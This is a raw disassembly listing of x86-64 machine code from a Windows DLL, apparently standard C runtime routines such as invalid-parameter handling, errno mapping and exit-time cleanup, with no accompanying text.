   180007308:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000730d:	48 89 03             	mov    %rax,(%rbx)
   180007310:	eb 10                	jmp    0x180007322
   180007312:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180007317:	e8 54 38 00 00       	call   0x18000ab70
   18000731c:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180007320:	89 03                	mov    %eax,(%rbx)
   180007322:	48 83 c4 30          	add    $0x30,%rsp
   180007326:	5b                   	pop    %rbx
   180007327:	c3                   	ret
   180007328:	33 d2                	xor    %edx,%edx
   18000732a:	e9 01 00 00 00       	jmp    0x180007330
   18000732f:	cc                   	int3
   180007330:	40 53                	rex push %rbx
   180007332:	48 83 ec 40          	sub    $0x40,%rsp
   180007336:	48 8b d9             	mov    %rcx,%rbx
   180007339:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000733e:	e8 b1 eb ff ff       	call   0x180005ef4
   180007343:	0f be 0b             	movsbl (%rbx),%ecx
   180007346:	e8 a5 33 00 00       	call   0x18000a6f0
   18000734b:	83 f8 65             	cmp    $0x65,%eax
   18000734e:	74 0f                	je     0x18000735f
   180007350:	48 ff c3             	inc    %rbx
   180007353:	0f b6 0b             	movzbl (%rbx),%ecx
   180007356:	e8 c5 31 00 00       	call   0x18000a520
   18000735b:	85 c0                	test   %eax,%eax
   18000735d:	75 f1                	jne    0x180007350
   18000735f:	0f be 0b             	movsbl (%rbx),%ecx
   180007362:	e8 89 33 00 00       	call   0x18000a6f0
   180007367:	83 f8 78             	cmp    $0x78,%eax
   18000736a:	75 04                	jne    0x180007370
   18000736c:	48 83 c3 02          	add    $0x2,%rbx
   180007370:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180007375:	8a 13                	mov    (%rbx),%dl
   180007377:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   18000737e:	48 8b 01             	mov    (%rcx),%rax
   180007381:	8a 08                	mov    (%rax),%cl
   180007383:	88 0b                	mov    %cl,(%rbx)
   180007385:	48 ff c3             	inc    %rbx
   180007388:	8a 03                	mov    (%rbx),%al
   18000738a:	88 13                	mov    %dl,(%rbx)
   18000738c:	8a d0                	mov    %al,%dl
   18000738e:	8a 03                	mov    (%rbx),%al
   180007390:	48 ff c3             	inc    %rbx
   180007393:	84 c0                	test   %al,%al
   180007395:	75 f1                	jne    0x180007388
   180007397:	38 44 24 38          	cmp    %al,0x38(%rsp)
   18000739b:	74 0c                	je     0x1800073a9
   18000739d:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1800073a2:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1800073a9:	48 83 c4 40          	add    $0x40,%rsp
   1800073ad:	5b                   	pop    %rbx
   1800073ae:	c3                   	ret
   1800073af:	cc                   	int3
   1800073b0:	f2 0f 10 01          	movsd  (%rcx),%xmm0
   1800073b4:	33 c0                	xor    %eax,%eax
   1800073b6:	66 0f 2f 05 42 a4 00 	comisd 0xa442(%rip),%xmm0        # 0x180011800
   1800073bd:	00 
   1800073be:	0f 93 c0             	setae  %al
   1800073c1:	c3                   	ret
   1800073c2:	cc                   	int3
   1800073c3:	cc                   	int3
   1800073c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800073c9:	57                   	push   %rdi
   1800073ca:	48 83 ec 20          	sub    $0x20,%rsp
   1800073ce:	33 ff                	xor    %edi,%edi
   1800073d0:	48 8d 1d 59 1c 01 00 	lea    0x11c59(%rip),%rbx        # 0x180019030
   1800073d7:	48 8b 0b             	mov    (%rbx),%rcx
   1800073da:	ff 15 d0 9c 00 00    	call   *0x9cd0(%rip)        # 0x1800110b0
   1800073e0:	ff c7                	inc    %edi
   1800073e2:	48 89 03             	mov    %rax,(%rbx)
   1800073e5:	48 63 c7             	movslq %edi,%rax
   1800073e8:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   1800073ec:	48 83 f8 0a          	cmp    $0xa,%rax
   1800073f0:	72 e5                	jb     0x1800073d7
   1800073f2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800073f7:	48 83 c4 20          	add    $0x20,%rsp
   1800073fb:	5f                   	pop    %rdi
   1800073fc:	c3                   	ret
   1800073fd:	cc                   	int3
   1800073fe:	cc                   	int3
   1800073ff:	cc                   	int3
   180007400:	48 8b c4             	mov    %rsp,%rax
   180007403:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180007407:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000740b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000740f:	55                   	push   %rbp
   180007410:	48 8d a8 48 fb ff ff 	lea    -0x4b8(%rax),%rbp
   180007417:	48 81 ec b0 05 00 00 	sub    $0x5b0,%rsp
   18000741e:	48 8b 05 db 1b 01 00 	mov    0x11bdb(%rip),%rax        # 0x180019000
   180007425:	48 33 c4             	xor    %rsp,%rax
   180007428:	48 89 85 a0 04 00 00 	mov    %rax,0x4a0(%rbp)
   18000742f:	41 8b f8             	mov    %r8d,%edi
   180007432:	8b f2                	mov    %edx,%esi
   180007434:	8b d9                	mov    %ecx,%ebx
   180007436:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180007439:	74 05                	je     0x180007440
   18000743b:	e8 d8 30 00 00       	call   0x18000a518
   180007440:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   180007445:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   18000744a:	33 d2                	xor    %edx,%edx
   18000744c:	41 b8 94 00 00 00    	mov    $0x94,%r8d
   180007452:	e8 09 de ff ff       	call   0x180005260
   180007457:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   18000745c:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   180007460:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007465:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   180007469:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000746e:	e8 c1 26 00 00       	call   0x180009b34
   180007473:	48 8b 85 b8 04 00 00 	mov    0x4b8(%rbp),%rax
   18000747a:	48 89 85 c8 00 00 00 	mov    %rax,0xc8(%rbp)
   180007481:	48 8d 85 b8 04 00 00 	lea    0x4b8(%rbp),%rax
   180007488:	89 74 24 30          	mov    %esi,0x30(%rsp)
   18000748c:	48 83 c0 08          	add    $0x8,%rax
   180007490:	89 7c 24 34          	mov    %edi,0x34(%rsp)
   180007494:	48 89 45 68          	mov    %rax,0x68(%rbp)
   180007498:	48 8b 85 b8 04 00 00 	mov    0x4b8(%rbp),%rax
   18000749f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800074a4:	ff 15 f6 9b 00 00    	call   *0x9bf6(%rip)        # 0x1800110a0
   1800074aa:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800074af:	8b f8                	mov    %eax,%edi
   1800074b1:	e8 6e 2c 00 00       	call   0x18000a124
   1800074b6:	85 c0                	test   %eax,%eax
   1800074b8:	75 10                	jne    0x1800074ca
   1800074ba:	85 ff                	test   %edi,%edi
   1800074bc:	75 0c                	jne    0x1800074ca
   1800074be:	83 fb ff             	cmp    $0xffffffff,%ebx
   1800074c1:	74 07                	je     0x1800074ca
   1800074c3:	8b cb                	mov    %ebx,%ecx
   1800074c5:	e8 4e 30 00 00       	call   0x18000a518
   1800074ca:	48 8b 8d a0 04 00 00 	mov    0x4a0(%rbp),%rcx
   1800074d1:	48 33 cc             	xor    %rsp,%rcx
   1800074d4:	e8 57 dd ff ff       	call   0x180005230
   1800074d9:	4c 8d 9c 24 b0 05 00 	lea    0x5b0(%rsp),%r11
   1800074e0:	00 
   1800074e1:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1800074e5:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1800074e9:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   1800074ed:	49 8b e3             	mov    %r11,%rsp
   1800074f0:	5d                   	pop    %rbp
   1800074f1:	c3                   	ret
   1800074f2:	cc                   	int3
   1800074f3:	cc                   	int3
   1800074f4:	48 89 0d 9d 38 01 00 	mov    %rcx,0x1389d(%rip)        # 0x18001ad98
   1800074fb:	c3                   	ret
   1800074fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007501:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180007506:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000750b:	57                   	push   %rdi
   18000750c:	48 83 ec 30          	sub    $0x30,%rsp
   180007510:	48 8b e9             	mov    %rcx,%rbp
   180007513:	48 8b 0d 7e 38 01 00 	mov    0x1387e(%rip),%rcx        # 0x18001ad98
   18000751a:	41 8b d9             	mov    %r9d,%ebx
   18000751d:	49 8b f8             	mov    %r8,%rdi
   180007520:	48 8b f2             	mov    %rdx,%rsi
   180007523:	ff 15 8f 9b 00 00    	call   *0x9b8f(%rip)        # 0x1800110b8
   180007529:	44 8b cb             	mov    %ebx,%r9d
   18000752c:	4c 8b c7             	mov    %rdi,%r8
   18000752f:	48 8b d6             	mov    %rsi,%rdx
   180007532:	48 8b cd             	mov    %rbp,%rcx
   180007535:	48 85 c0             	test   %rax,%rax
   180007538:	74 17                	je     0x180007551
   18000753a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000753f:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180007544:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180007549:	48 83 c4 30          	add    $0x30,%rsp
   18000754d:	5f                   	pop    %rdi
   18000754e:	48 ff e0             	rex.W jmp *%rax
   180007551:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180007556:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000755b:	e8 24 00 00 00       	call   0x180007584
   180007560:	cc                   	int3
   180007561:	cc                   	int3
   180007562:	cc                   	int3
   180007563:	cc                   	int3
   180007564:	48 83 ec 38          	sub    $0x38,%rsp
   180007568:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000756e:	45 33 c9             	xor    %r9d,%r9d
   180007571:	45 33 c0             	xor    %r8d,%r8d
   180007574:	33 d2                	xor    %edx,%edx
   180007576:	33 c9                	xor    %ecx,%ecx
   180007578:	e8 7f ff ff ff       	call   0x1800074fc
   18000757d:	48 83 c4 38          	add    $0x38,%rsp
   180007581:	c3                   	ret
   180007582:	cc                   	int3
   180007583:	cc                   	int3
   180007584:	48 83 ec 28          	sub    $0x28,%rsp
   180007588:	b9 17 00 00 00       	mov    $0x17,%ecx
   18000758d:	e8 de 8a 00 00       	call   0x180010070
   180007592:	85 c0                	test   %eax,%eax
   180007594:	74 07                	je     0x18000759d
   180007596:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000759b:	cd 29                	int    $0x29
   18000759d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800075a3:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   1800075a8:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1800075ac:	e8 4f fe ff ff       	call   0x180007400
   1800075b1:	b9 17 04 00 c0       	mov    $0xc0000417,%ecx
   1800075b6:	48 83 c4 28          	add    $0x28,%rsp
   1800075ba:	e9 45 2b 00 00       	jmp    0x18000a104
   1800075bf:	cc                   	int3
   1800075c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800075c4:	e8 1b 18 00 00       	call   0x180008de4
   1800075c9:	48 85 c0             	test   %rax,%rax
   1800075cc:	75 09                	jne    0x1800075d7
   1800075ce:	48 8d 05 17 1c 01 00 	lea    0x11c17(%rip),%rax        # 0x1800191ec
   1800075d5:	eb 04                	jmp    0x1800075db
   1800075d7:	48 83 c0 14          	add    $0x14,%rax
   1800075db:	48 83 c4 28          	add    $0x28,%rsp
   1800075df:	c3                   	ret
   1800075e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800075e5:	57                   	push   %rdi
   1800075e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800075ea:	8b f9                	mov    %ecx,%edi
   1800075ec:	e8 f3 17 00 00       	call   0x180008de4
   1800075f1:	48 85 c0             	test   %rax,%rax
   1800075f4:	75 09                	jne    0x1800075ff
   1800075f6:	48 8d 05 ef 1b 01 00 	lea    0x11bef(%rip),%rax        # 0x1800191ec
   1800075fd:	eb 04                	jmp    0x180007603
   1800075ff:	48 83 c0 14          	add    $0x14,%rax
   180007603:	89 38                	mov    %edi,(%rax)
   180007605:	e8 da 17 00 00       	call   0x180008de4
   18000760a:	48 8d 1d d7 1b 01 00 	lea    0x11bd7(%rip),%rbx        # 0x1800191e8
   180007611:	48 85 c0             	test   %rax,%rax
   180007614:	74 04                	je     0x18000761a
   180007616:	48 8d 58 10          	lea    0x10(%rax),%rbx
   18000761a:	8b cf                	mov    %edi,%ecx
   18000761c:	e8 2f 00 00 00       	call   0x180007650
   180007621:	89 03                	mov    %eax,(%rbx)
   180007623:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007628:	48 83 c4 20          	add    $0x20,%rsp
   18000762c:	5f                   	pop    %rdi
   18000762d:	c3                   	ret
   18000762e:	cc                   	int3
   18000762f:	cc                   	int3
   180007630:	48 83 ec 28          	sub    $0x28,%rsp
   180007634:	e8 ab 17 00 00       	call   0x180008de4
   180007639:	48 85 c0             	test   %rax,%rax
   18000763c:	75 09                	jne    0x180007647
   18000763e:	48 8d 05 a3 1b 01 00 	lea    0x11ba3(%rip),%rax        # 0x1800191e8
   180007645:	eb 04                	jmp    0x18000764b
   180007647:	48 83 c0 10          	add    $0x10,%rax
   18000764b:	48 83 c4 28          	add    $0x28,%rsp
   18000764f:	c3                   	ret
   180007650:	4c 8d 15 29 1a 01 00 	lea    0x11a29(%rip),%r10        # 0x180019080
   180007657:	33 d2                	xor    %edx,%edx
   180007659:	4d 8b c2             	mov    %r10,%r8
   18000765c:	44 8d 4a 08          	lea    0x8(%rdx),%r9d
   180007660:	41 3b 08             	cmp    (%r8),%ecx
   180007663:	74 2f                	je     0x180007694
   180007665:	ff c2                	inc    %edx
   180007667:	4d 03 c1             	add    %r9,%r8
   18000766a:	48 63 c2             	movslq %edx,%rax
   18000766d:	48 83 f8 2d          	cmp    $0x2d,%rax
   180007671:	72 ed                	jb     0x180007660
   180007673:	8d 41 ed             	lea    -0x13(%rcx),%eax
   180007676:	83 f8 11             	cmp    $0x11,%eax
   180007679:	77 06                	ja     0x180007681
   18000767b:	b8 0d 00 00 00       	mov    $0xd,%eax
   180007680:	c3                   	ret
   180007681:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   180007687:	b8 16 00 00 00       	mov    $0x16,%eax
   18000768c:	83 f9 0e             	cmp    $0xe,%ecx
   18000768f:	41 0f 46 c1          	cmovbe %r9d,%eax
   180007693:	c3                   	ret
   180007694:	48 63 c2             	movslq %edx,%rax
   180007697:	41 8b 44 c2 04       	mov    0x4(%r10,%rax,8),%eax
   18000769c:	c3                   	ret
   18000769d:	cc                   	int3
   18000769e:	cc                   	int3
   18000769f:	cc                   	int3
   1800076a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800076a4:	ff 15 16 9a 00 00    	call   *0x9a16(%rip)        # 0x1800110c0
   1800076aa:	33 c9                	xor    %ecx,%ecx
   1800076ac:	48 85 c0             	test   %rax,%rax
   1800076af:	48 89 05 ea 36 01 00 	mov    %rax,0x136ea(%rip)        # 0x18001ada0
   1800076b6:	0f 95 c1             	setne  %cl
   1800076b9:	8b c1                	mov    %ecx,%eax
   1800076bb:	48 83 c4 28          	add    $0x28,%rsp
   1800076bf:	c3                   	ret
   1800076c0:	48 83 25 d8 36 01 00 	andq   $0x0,0x136d8(%rip)        # 0x18001ada0
   1800076c7:	00 
   1800076c8:	c3                   	ret
   1800076c9:	cc                   	int3
   1800076ca:	cc                   	int3
   1800076cb:	cc                   	int3
   1800076cc:	40 53                	rex push %rbx
   1800076ce:	48 83 ec 20          	sub    $0x20,%rsp
   1800076d2:	48 8b d9             	mov    %rcx,%rbx
   1800076d5:	48 8b 0d cc 36 01 00 	mov    0x136cc(%rip),%rcx        # 0x18001ada8
   1800076dc:	ff 15 d6 99 00 00    	call   *0x99d6(%rip)        # 0x1800110b8
   1800076e2:	48 85 c0             	test   %rax,%rax
   1800076e5:	74 10                	je     0x1800076f7
   1800076e7:	48 8b cb             	mov    %rbx,%rcx
   1800076ea:	ff d0                	call   *%rax
   1800076ec:	85 c0                	test   %eax,%eax
   1800076ee:	74 07                	je     0x1800076f7
   1800076f0:	b8 01 00 00 00       	mov    $0x1,%eax
   1800076f5:	eb 02                	jmp    0x1800076f9
   1800076f7:	33 c0                	xor    %eax,%eax
   1800076f9:	48 83 c4 20          	add    $0x20,%rsp
   1800076fd:	5b                   	pop    %rbx
   1800076fe:	c3                   	ret
   1800076ff:	cc                   	int3
   180007700:	48 89 0d a1 36 01 00 	mov    %rcx,0x136a1(%rip)        # 0x18001ada8
   180007707:	c3                   	ret
   180007708:	40 53                	rex push %rbx
   18000770a:	48 83 ec 20          	sub    $0x20,%rsp
   18000770e:	8b d9                	mov    %ecx,%ebx
   180007710:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   180007715:	48 8d 15 ec a0 00 00 	lea    0xa0ec(%rip),%rdx        # 0x180011808
   18000771c:	33 c9                	xor    %ecx,%ecx
   18000771e:	ff 15 ac 99 00 00    	call   *0x99ac(%rip)        # 0x1800110d0
   180007724:	85 c0                	test   %eax,%eax
   180007726:	74 1b                	je     0x180007743
   180007728:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   18000772d:	48 8d 15 ec a0 00 00 	lea    0xa0ec(%rip),%rdx        # 0x180011820
   180007734:	ff 15 1e 99 00 00    	call   *0x991e(%rip)        # 0x180011058
   18000773a:	48 85 c0             	test   %rax,%rax
   18000773d:	74 04                	je     0x180007743
   18000773f:	8b cb                	mov    %ebx,%ecx
   180007741:	ff d0                	call   *%rax
   180007743:	48 83 c4 20          	add    $0x20,%rsp
   180007747:	5b                   	pop    %rbx
   180007748:	c3                   	ret
   180007749:	cc                   	int3
   18000774a:	cc                   	int3
   18000774b:	cc                   	int3
   18000774c:	40 53                	rex push %rbx
   18000774e:	48 83 ec 20          	sub    $0x20,%rsp
   180007752:	8b d9                	mov    %ecx,%ebx
   180007754:	e8 af ff ff ff       	call   0x180007708
   180007759:	8b cb                	mov    %ebx,%ecx
   18000775b:	ff 15 67 99 00 00    	call   *0x9967(%rip)        # 0x1800110c8
   180007761:	cc                   	int3
   180007762:	cc                   	int3
   180007763:	cc                   	int3
   180007764:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007769:	57                   	push   %rdi
   18000776a:	48 83 ec 20          	sub    $0x20,%rsp
   18000776e:	48 8b 0d 4b 54 01 00 	mov    0x1544b(%rip),%rcx        # 0x18001cbc0
   180007775:	ff 15 3d 99 00 00    	call   *0x993d(%rip)        # 0x1800110b8
   18000777b:	48 8b 1d 4e 36 01 00 	mov    0x1364e(%rip),%rbx        # 0x18001add0
   180007782:	48 8b f8             	mov    %rax,%rdi
   180007785:	48 85 db             	test   %rbx,%rbx
   180007788:	74 1a                	je     0x1800077a4
   18000778a:	48 8b 0b             	mov    (%rbx),%rcx
   18000778d:	48 85 c9             	test   %rcx,%rcx
   180007790:	74 0b                	je     0x18000779d
   180007792:	e8 e9 dd ff ff       	call   0x180005580
   180007797:	48 83 c3 08          	add    $0x8,%rbx
   18000779b:	75 ed                	jne    0x18000778a
   18000779d:	48 8b 1d 2c 36 01 00 	mov    0x1362c(%rip),%rbx        # 0x18001add0
   1800077a4:	48 8b cb             	mov    %rbx,%rcx
   1800077a7:	e8 d4 dd ff ff       	call   0x180005580
   1800077ac:	48 8b 1d 15 36 01 00 	mov    0x13615(%rip),%rbx        # 0x18001adc8
   1800077b3:	48 83 25 15 36 01 00 	andq   $0x0,0x13615(%rip)        # 0x18001add0
   1800077ba:	00 
   1800077bb:	48 85 db             	test   %rbx,%rbx
   1800077be:	74 1a                	je     0x1800077da
   1800077c0:	48 8b 0b             	mov    (%rbx),%rcx
   1800077c3:	48 85 c9             	test   %rcx,%rcx
   1800077c6:	74 0b                	je     0x1800077d3
   1800077c8:	e8 b3 dd ff ff       	call   0x180005580
   1800077cd:	48 83 c3 08          	add    $0x8,%rbx
   1800077d1:	75 ed                	jne    0x1800077c0
   1800077d3:	48 8b 1d ee 35 01 00 	mov    0x135ee(%rip),%rbx        # 0x18001adc8
   1800077da:	48 8b cb             	mov    %rbx,%rcx
   1800077dd:	e8 9e dd ff ff       	call   0x180005580
   1800077e2:	48 8b 0d d7 35 01 00 	mov    0x135d7(%rip),%rcx        # 0x18001adc0
   1800077e9:	48 83 25 d7 35 01 00 	andq   $0x0,0x135d7(%rip)        # 0x18001adc8
   1800077f0:	00 
   1800077f1:	e8 8a dd ff ff       	call   0x180005580
   1800077f6:	48 8b 0d bb 35 01 00 	mov    0x135bb(%rip),%rcx        # 0x18001adb8
   1800077fd:	e8 7e dd ff ff       	call   0x180005580
   180007802:	48 83 25 b6 35 01 00 	andq   $0x0,0x135b6(%rip)        # 0x18001adc0
   180007809:	00 
   18000780a:	48 83 25 a6 35 01 00 	andq   $0x0,0x135a6(%rip)        # 0x18001adb8
   180007811:	00 
   180007812:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   180007816:	48 3b fb             	cmp    %rbx,%rdi
   180007819:	74 12                	je     0x18000782d
   18000781b:	48 83 3d 9d 53 01 00 	cmpq   $0x0,0x1539d(%rip)        # 0x18001cbc0
   180007822:	00 
   180007823:	74 08                	je     0x18000782d
   180007825:	48 8b cf             	mov    %rdi,%rcx
   180007828:	e8 53 dd ff ff       	call   0x180005580
   18000782d:	48 8b cb             	mov    %rbx,%rcx
   180007830:	ff 15 7a 98 00 00    	call   *0x987a(%rip)        # 0x1800110b0
   180007836:	48 8b 0d c3 41 01 00 	mov    0x141c3(%rip),%rcx        # 0x18001ba00
   18000783d:	48 89 05 7c 53 01 00 	mov    %rax,0x1537c(%rip)        # 0x18001cbc0
   180007844:	48 85 c9             	test   %rcx,%rcx
   180007847:	74 0d                	je     0x180007856
   180007849:	e8 32 dd ff ff       	call   0x180005580
   18000784e:	48 83 25 aa 41 01 00 	andq   $0x0,0x141aa(%rip)        # 0x18001ba00
   180007855:	00 
   180007856:	48 8b 0d ab 41 01 00 	mov    0x141ab(%rip),%rcx        # 0x18001ba08
   18000785d:	48 85 c9             	test   %rcx,%rcx
   180007860:	74 0d                	je     0x18000786f
   180007862:	e8 19 dd ff ff       	call   0x180005580
   180007867:	48 83 25 99 41 01 00 	andq   $0x0,0x14199(%rip)        # 0x18001ba08
   18000786e:	00 
   18000786f:	48 8b 05 aa 1e 01 00 	mov    0x11eaa(%rip),%rax        # 0x180019720
   180007876:	8b cb                	mov    %ebx,%ecx
   180007878:	f0 0f c1 08          	lock xadd %ecx,(%rax)
   18000787c:	03 cb                	add    %ebx,%ecx
   18000787e:	75 1f                	jne    0x18000789f
   180007880:	48 8b 0d 99 1e 01 00 	mov    0x11e99(%rip),%rcx        # 0x180019720
   180007887:	48 8d 1d 72 1b 01 00 	lea    0x11b72(%rip),%rbx        # 0x180019400
   18000788e:	48 3b cb             	cmp    %rbx,%rcx
   180007891:	74 0c                	je     0x18000789f
   180007893:	e8 e8 dc ff ff       	call   0x180005580
   180007898:	48 89 1d 81 1e 01 00 	mov    %rbx,0x11e81(%rip)        # 0x180019720
   18000789f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800078a4:	48 83 c4 20          	add    $0x20,%rsp
   1800078a8:	5f                   	pop    %rdi
   1800078a9:	c3                   	ret
   1800078aa:	cc                   	int3
   1800078ab:	cc                   	int3
   1800078ac:	40 53                	rex push %rbx
   1800078ae:	48 83 ec 20          	sub    $0x20,%rsp
   1800078b2:	8b d9                	mov    %ecx,%ebx
   1800078b4:	e8 67 03 00 00       	call   0x180007c20
   1800078b9:	8b cb                	mov    %ebx,%ecx
   1800078bb:	e8 d4 03 00 00       	call   0x180007c94
   1800078c0:	45 33 c0             	xor    %r8d,%r8d
   1800078c3:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1800078c8:	41 8d 50 01          	lea    0x1(%r8),%edx
   1800078cc:	e8 b7 01 00 00       	call   0x180007a88
   1800078d1:	cc                   	int3
   1800078d2:	cc                   	int3
   1800078d3:	cc                   	int3
   1800078d4:	33 d2                	xor    %edx,%edx
   1800078d6:	33 c9                	xor    %ecx,%ecx
   1800078d8:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   1800078dc:	e9 a7 01 00 00       	jmp    0x180007a88
   1800078e1:	cc                   	int3
   1800078e2:	cc                   	int3
   1800078e3:	cc                   	int3
   1800078e4:	40 53                	rex push %rbx
   1800078e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800078ea:	48 83 3d de 9e 00 00 	cmpq   $0x0,0x9ede(%rip)        # 0x1800117d0
   1800078f1:	00 
   1800078f2:	8b d9                	mov    %ecx,%ebx
   1800078f4:	74 18                	je     0x18000790e
   1800078f6:	48 8d 0d d3 9e 00 00 	lea    0x9ed3(%rip),%rcx        # 0x1800117d0
   1800078fd:	e8 6e 36 00 00       	call   0x18000af70
   180007902:	85 c0                	test   %eax,%eax
   180007904:	74 08                	je     0x18000790e
   180007906:	8b cb                	mov    %ebx,%ecx
   180007908:	e8 73 b2 ff ff       	call   0x180002b80
   18000790d:	00 e8                	add    %ch,%al
   18000790f:	b1 fa                	mov    $0xfa,%cl
   180007911:	ff                   	(bad)
   180007912:	ff 48 8d             	decl   -0x73(%rax)
   180007915:	15 86 99 00 00       	adc    $0x9986,%eax
   18000791a:	48 8d 0d 57 99 00 00 	lea    0x9957(%rip),%rcx        # 0x180011278
   180007921:	e8 0e 01 00 00       	call   0x180007a34
   180007926:	85 c0                	test   %eax,%eax
   180007928:	75 4a                	jne    0x180007974
   18000792a:	48 8d 0d cb 29 00 00 	lea    0x29cb(%rip),%rcx        # 0x18000a2fc
   180007931:	e8 0a 38 00 00       	call   0x18000b140
   180007936:	48 8d 15 33 99 00 00 	lea    0x9933(%rip),%rdx        # 0x180011270
   18000793d:	48 8d 0d 24 99 00 00 	lea    0x9924(%rip),%rcx        # 0x180011268
   180007944:	e8 8b 00 00 00       	call   0x1800079d4
   180007949:	48 83 3d 5f 52 01 00 	cmpq   $0x0,0x1525f(%rip)        # 0x18001cbb0
   180007950:	00 
   180007951:	74 1f                	je     0x180007972
   180007953:	48 8d 0d 56 52 01 00 	lea    0x15256(%rip),%rcx        # 0x18001cbb0
   18000795a:	e8 11 36 00 00       	call   0x18000af70
   18000795f:	85 c0                	test   %eax,%eax
   180007961:	74 0f                	je     0x180007972
   180007963:	45 33 c0             	xor    %r8d,%r8d
   180007966:	33 c9                	xor    %ecx,%ecx
   180007968:	41 8d 50 02          	lea    0x2(%r8),%edx
   18000796c:	ff 15 3e 52 01 00    	call   *0x1523e(%rip)        # 0x18001cbb0
   180007972:	33 c0                	xor    %eax,%eax
   180007974:	48 83 c4 20          	add    $0x20,%rsp
   180007978:	5b                   	pop    %rbx
   180007979:	c3                   	ret
   18000797a:	cc                   	int3
   18000797b:	cc                   	int3
   18000797c:	45 33 c0             	xor    %r8d,%r8d
   18000797f:	41 8d 50 01          	lea    0x1(%r8),%edx
   180007983:	e9 00 01 00 00       	jmp    0x180007a88
   180007988:	40 53                	rex push %rbx
   18000798a:	48 83 ec 20          	sub    $0x20,%rsp
   18000798e:	33 c9                	xor    %ecx,%ecx
   180007990:	ff 15 1a 97 00 00    	call   *0x971a(%rip)        # 0x1800110b0
   180007996:	48 8b c8             	mov    %rax,%rcx
   180007999:	48 8b d8             	mov    %rax,%rbx
   18000799c:	e8 5f fd ff ff       	call   0x180007700
   1800079a1:	48 8b cb             	mov    %rbx,%rcx
   1800079a4:	e8 4b fb ff ff       	call   0x1800074f4
   1800079a9:	48 8b cb             	mov    %rbx,%rcx
   1800079ac:	e8 e7 37 00 00       	call   0x18000b198
   1800079b1:	48 8b cb             	mov    %rbx,%rcx
   1800079b4:	e8 f7 37 00 00       	call   0x18000b1b0
   1800079b9:	48 8b cb             	mov    %rbx,%rcx
   1800079bc:	e8 b7 37 00 00       	call   0x18000b178
   1800079c1:	48 8b cb             	mov    %rbx,%rcx
   1800079c4:	e8 3b 3a 00 00       	call   0x18000b404
   1800079c9:	48 83 c4 20          	add    $0x20,%rsp
   1800079cd:	5b                   	pop    %rbx
   1800079ce:	e9 2d 23 00 00       	jmp    0x180009d00
   1800079d3:	cc                   	int3
   1800079d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800079d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800079de:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800079e3:	57                   	push   %rdi
   1800079e4:	48 83 ec 20          	sub    $0x20,%rsp
   1800079e8:	33 ed                	xor    %ebp,%ebp
   1800079ea:	48 8b da             	mov    %rdx,%rbx
   1800079ed:	48 8b f9             	mov    %rcx,%rdi
   1800079f0:	48 2b d9             	sub    %rcx,%rbx
   1800079f3:	8b f5                	mov    %ebp,%esi
   1800079f5:	48 83 c3 07          	add    $0x7,%rbx
   1800079f9:	48 c1 eb 03          	shr    $0x3,%rbx
   1800079fd:	48 3b ca             	cmp    %rdx,%rcx
   180007a00:	48 0f 47 dd          	cmova  %rbp,%rbx
   180007a04:	48 85 db             	test   %rbx,%rbx
   180007a07:	74 16                	je     0x180007a1f
   180007a09:	48 8b 07             	mov    (%rdi),%rax
   180007a0c:	48 85 c0             	test   %rax,%rax
   180007a0f:	74 02                	je     0x180007a13
   180007a11:	ff d0                	call   *%rax
   180007a13:	48 ff c6             	inc    %rsi
